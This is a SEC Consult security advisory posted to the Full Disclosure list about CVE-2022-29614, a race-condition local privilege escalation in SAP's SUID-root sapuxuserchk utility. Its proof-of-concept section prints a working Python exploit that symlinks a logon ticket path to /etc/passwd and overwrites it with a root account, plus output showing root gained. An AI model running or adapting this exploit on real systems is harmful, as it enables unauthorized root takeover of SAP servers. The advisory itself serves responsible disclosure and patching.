@@ -1,0 +1,281 @@
+
+Date: Thu, 15 Sep 2022 07:22:38 +0000
+From: "SEC Consult Vulnerability Lab,
+ Research via Fulldisclosure" <fulldisclosure@...lists.org>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] SEC Consult SA-20220915-0 :: Local Privilege Escalation im SAP® SAPControl Web Service Interface (sapuxuserchk)
+
+SEC Consult Vulnerability Lab Security Advisory < 20220915-0 >
+=======================================================================
+               title: Local privilege escalation
+             product: SAP® SAPControl Web Service Interface (sapuxuserchk)
+  vulnerable version: see section "Vulnerable /  tested versions"
+       fixed version: see SAP security note 3158619
+          CVE number: CVE-2022-29614
+              impact: medium
+            homepage: https://www.sap.com/about.html
+               found: 2022-02-24
+                  by: M. Li (Office Munich)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"The SAP Start Service (sapstartsrv) provides basic management services for
+systems and instances and single server processes. Services include starting
+and stopping, monitoring the current run-time state, reading logs, traces and
+configuration files, executing commands and retrieving other
+technology-specific information, like network access points, active sessions,
+thread list etc. They are exposed by a SOAP Web service interface named
+"SAPControl". This paper describes how to use this Web service interface."
+
+Source: https://assets.cdn.sap.com/sapcom/docs/2016/09/0a40e60d-8b7c-0010-82c7-eda71af511fa.pdf
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends to implement the security note 3158619, where the
+documented issue is fixed according to the vendor. We advise installing the
+corrections as a matter of priority to keep business-critical data secured.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Local privilege escalation (CVE-2022-29614)
+The SUID-root program sapuxuserchk erroneously follows the symbolic link to
+create a temporary local logon ticket and change the ownership of the target
+file for owner access only. As member of the group sapsys, a user can therefore
+escalate his/her privileges to root on a local Unix system by successfully
+exploiting a race condition.
+
+
+Proof of concept:
+-----------------
+1) Local privilege escalation (CVE-2022-29614)
+The utility sapuxuserchk is used by sapcontrol to request a temporary local
+logon ticket in the following way. As a result, the ticket is created in the
+folder /usr/sap/SEC/D00/work/sapcontrol_logon/
+
+$ sapcontrol -nr 0 -function RequestLogonFile user0
+
+$ ls -l logon*
+-rw------- 1 secadm sapsys 40 Feb 25 08:58 logon0
+-rw------- 1 user0  users  40 Feb 25 09:00 logon1
+-rw------- 1 root   root   40 Feb 25 09:01 logon2
+
+
+Since sapcontrol is supposed to create the ticket for any system user, it
+requires a utility with SUID bit set. The owner, group and its permission bits
+of sapuxuserchk of a standard installation are shown below.
+
+$ ls -l sapuxuserchk
+-rwsr-x--- 1 root sapsys 1312137 Feb 28  2019 sapuxuserchk
+
+The request originating from sapcontrol is first sent to the instance server
+sapstartsrv, piping into sapuxuserchk a 512-byte encrypted message, which
+contains the ticket path, user name and ticket in the plaintext, as an example
+shown below.
+
+$ strings input-0-plaintext
+SAPLOGONFILE /usr/sap/SEC/D00/work/sapcontrol_logon/logon1
+  user0
+1133146902252676394602837452470900726967
+
+
+On its duty to create the ticket, sapuxuserchk performs the sanity check to
+guarantee the non-existence of the file prior to the creation in the
+function internal_create_saplogon_file.
+
+However, it introduces a race condition between the stat and open calls, as
+shown by the following excerpt from strace.
+
+stat("/usr/sap/SEC/D00/work/sapcontrol_logon/logon1", 0x7ffc0d2e1530) = -1 ENOENT (No such file or directory)
+open("/usr/sap/SEC/D00/work/sapcontrol_logon/logon1", O_RDWR|O_CREAT|O_TRUNC, 0600) = 3
+	fchown(3, 1000, 100)
+
+
+The attacker can run a race of constantly creating a symbolic link logon1
+pointing to a privileged file such as /etc/passwd and meanwhile invoke the
+SUID-root program sapuxuserchk, in the hope that the creation of the link
+take place between the stat and open calls, so that the first will fail,
+(meaning that the file does not exist yet) while the second as well as the
+ensuing fchown call succeeds. In a positive result, the attacker gains the
+read-write permission of the target file.
+
+The following run to winning the race took 629 attempts to finally gain the
+root privilege. The PoC further below lists the exploit implementing the idea
+above with a pre-intercepted message for user secadm.
+
+-------------------------------------------------------------------------
+sh-4.3$ id
+uid=1001(secadm) gid=474(sapsys) groups=474(sapsys),1000(sapinst)
+
+sh-4.3$ ls -l /etc/passwd
+-rw-r--r-- 1 root root 2517 Feb 25 00:47 /etc/passwd
+
+sh-4.3$ python3 sapmatt.py
+this many tries: 629
+[+] now login as sapmatt
+
+sh-4.3$ su sapmatt
+Password:
+
+sh-4.3# id
+uid=0(sapmatt) gid=0(root) groups=0(root)
+
+sh-4.3# ls -l /etc/passwd
+-rw-r--r-- 1 secadm sapsys 73 Feb 25 10:03 /etc/passwd
+
+
+$ cat sapmatt.py
+import sys, os, signal, base64, random, string
+
+secadm_msg = 
+b'O9OXlWwex4ddSI5vhXFfUQvZ8Td3NWzRNIb9QN6bHY764Z0zVNuVjFHRGhHEgYgwNQDnf0/bBwzlEXCSXFkhtiDqDohuyCxG4mtRqc86FlB6DTOjBY9o/6Cb3rRSZ58jggx71JXMRk21jW3gqdem+tmqHCnIumZjodk2cuk5/MY76dsD65s3j1XrQS0RT3gPaspl/6Yb842hbVTZXVRY3cHKzNq5tZMKB2LmyyslO4xCI00eBN6k6yEKNFLvMx8lYbAIaHcfdWu3pMWVIb9rT3BoTCHwi5hBz8dHk6usdEw05q/Xuxe28gxWCUZpN09sYsd/5R8HqqLfwyiNI7CTBCA3f+fHUweJPuteD5O8bwo/mEOShHimO1gPZzhBdow2C0JszYQeQpxgRtENXPUt2qgT7TJqmItxM0puB8ry0TnKJIbk5gj0smflBPBZyTDXl+qNUmgWL1dK/SBpTUErGMVXFVBi8bNDMSUhcJa+0IQlYSBHPln17kquqhGvlRYYZVJttDNoYcvBchc4HxHZmH5pHkD4fhbcQgFT0UFgceSH1j3sE6G/M/QM1X/vTVE4534XJ3mDcFk/brOYun1dawJ30BkJ9HbP5weihwRwspOq52qRZ9CXsnJCtFPNqNWNIe8BgQUW8WV7FkiDJ+Lpp0pq8KLlZ0Yomz46YfCHkag='
+# openssl passwd sappass
+u1_passwd = "sapmatt:wPi023oIkjHdA:0:0::/root:/bin/sh\nsecadm:x:1001:474::/tmp:/bin/sh\n"
+logon_symlink = "/usr/sap/SEC/D00/work/sapcontrol_logon/logon1"
+target_file = "/etc/passwd"
+
+g = 1024
+if not os.path.isfile(logon_symlink):
+         os.system("touch " + logon_symlink)
+secadm_msg = base64.b64decode(secadm_msg)
+
+msg_file = '/tmp/msg' + ''.join(random.choice(string.ascii_letters) for i in range(8))
+f0 = open(msg_file, "wb")
+f0.write(secadm_msg)
+f0.close()
+
+pid = os.fork()
+if pid == 0:
+         j = 0
+         while True:
+                 if j > g:
+                         print('done')
+                         os._exit(os.EX_OK)
+                 j += 1
+                 os.system("/usr/sap/SEC/D00/exe/sapuxuserchk < {0} > /dev/null".format(msg_file))
+else:
+         i = 0
+         uid = os.getuid()
+         success = False
+         while not success:
+                 if i > g:
+                         print("[-] give up, link too many tries: " + str(i))
+                         break
+                 i += 1
+                 try:
+                         os.unlink(logon_symlink)
+                         os.symlink(target_file, logon_symlink)
+                         statinfo = os.stat(target_file)
+                         if statinfo.st_uid == uid:
+                                 os.kill(pid, signal.SIGILL)
+                                 print("this many tries: " + str(i))
+                                 print("[+] now login as sapmatt ")
+                                 f = open(target_file, "w")
+                                 f.write(u1_passwd)
+                                 f.close()
+                                 success = True
+                 except Exception as err:
+                         print('[-] lost the race {0}'.format(err))
+         os.waitpid(pid, 0)
+         os.unlink(msg_file)
+
+-------------------------------------------------------------------------
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version of the binary was found to be vulnerable during our tests:
+* Version: 753, patch 400, changelist 1906766
+
+According to the vendor the following products are affected by the discovered
+vulnerability:
+
+SAP NetWeaver AS ABAP, AS Java, ABAP Platform and HANA Database, Versions:
+* KERNEL 7.22, 7.49, 7.53, 7.77, 7.81, 7.85, 7.86, 7.87, 7.88
+* KRNL64NUC 7.22, 7.22EXT, 7.49
+* KRNL64UC 7.22, 7.22EXT, 7.49, 7.53
+* SAPHOSTAGENT 7.2
+
+Please refer to the vendor patch day post:
+https://dam.sap.com/mac/app/e/pdf/preview/embed/ucQrx6G?ltr=a&rc=10
+
+
+Vendor contact timeline:
+------------------------
+2022-02-25: Contacting vendor through vulnerability submission web form.
+2022-03-04: Vendor confirms receipt and assigns SAP security incident number
+             #2270008914.
+2022-04-29: Requesting status update.
+2022-05-05: Vendor confirms vulnerability and states it might be addressed
+             in May 2022 patch day.
+2022-06-14: Vendor releases patches with SAP security note 3158619.
+2022-06-15: Requesting the confirmation of the security note on the issue.
+2022-08-11: Vendor sends the link to the Acknowledgements to Security
+             Researchers.
+2022-09-02: Requesting the confirmation of the fix.
+2022-09-03: Vendor confirms the issue has been fixed on June Patch Day.
+2022-09-15: Public release of security advisory.
+
+
+Solution:
+---------
+The following security note needs to be implemented:
+https://launchpad.support.sap.com/#/notes/3158619
+
+
+Workaround:
+-----------
+You can remove the SUID-bit from sapuxuserchk as temporary mitigation.
+
+# chmod 0755 sapuxuserchk
+
+
+Advisory URL:
+-------------
+https://sec-consult.com/vulnerability-lab/
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult, an Atos company
+Europe | Asia | North America
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
+Atos company. It ensures the continued knowledge gain of SEC Consult in the
+field of network and application security to stay ahead of the attacker. The
+SEC Consult Vulnerability Lab supports high-quality penetration testing and
+the evaluation of new offensive and defensive technologies for our customers.
+Hence our customers obtain the most current information about vulnerabilities
+and valid recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/career/
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/contact/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: security-research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF M. Li / @2022
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
